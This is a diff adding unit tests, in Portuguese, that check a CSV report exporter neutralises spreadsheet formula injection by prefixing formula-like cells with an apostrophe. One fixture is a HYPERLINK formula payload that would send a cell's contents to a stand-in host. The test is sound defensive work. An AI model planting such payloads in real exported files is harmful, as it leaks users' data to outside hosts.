@@ -47,6 +47,35 @@ describe("relatorioParaCSV", () => {
     const csv = relatorioParaCSV(resultado(["A", "B"], [["x", "y"]]));
     expect(csv).toBe(`${BOM}A;B\r\nx;y`);
   });
+
+  test("neutraliza célula que a planilha avaliaria como fórmula", () => {
+    const csv = relatorioParaCSV(resultado(["Nome"], [["=1+1"]]));
+    expect(csv).toBe(`${BOM}Nome\r\n'=1+1`);
+  });
+
+  test("neutraliza todos os prefixos de fórmula", () => {
+    const csv = relatorioParaCSV(resultado(["V"], [["+1"], ["-1"], ["@SUM(A1)"], ["\t=1"]]));
+    // O tab não é delimitador neste CSV (separador é `;`), então a célula é
+    // neutralizada sem precisar de aspas.
+    expect(csv).toBe(`${BOM}V\r\n'+1\r\n'-1\r\n'@SUM(A1)\r\n'\t=1`);
+  });
+
+  test("neutraliza o payload e ainda escapa o ponto e vírgula", () => {
+    const csv = relatorioParaCSV(resultado(["Nome"], [['=HYPERLINK("http://x/?d="&A2;"Clique")']]));
+    expect(csv).toBe(`${BOM}Nome\r\n"'=HYPERLINK(""http://x/?d=""&A2;""Clique"")"`);
+  });
+
+  test("números negativos continuam numéricos", () => {
+    const csv = relatorioParaCSV(resultado(["Saldo"], [[-5]]));
+    expect(csv).toBe(`${BOM}Saldo\r\n-5`);
+  });
+
+  test("texto legítimo não ganha apóstrofo", () => {
+    const csv = relatorioParaCSV(
+      resultado(["Nome", "Valor", "Vazio"], [["Ana Maria", "R$ 10,00", "—"]]),
+    );
+    expect(csv).toBe(`${BOM}Nome;Valor;Vazio\r\nAna Maria;R$ 10,00;—`);
+  });
 });
 
 describe("fmtDocumento", () => {
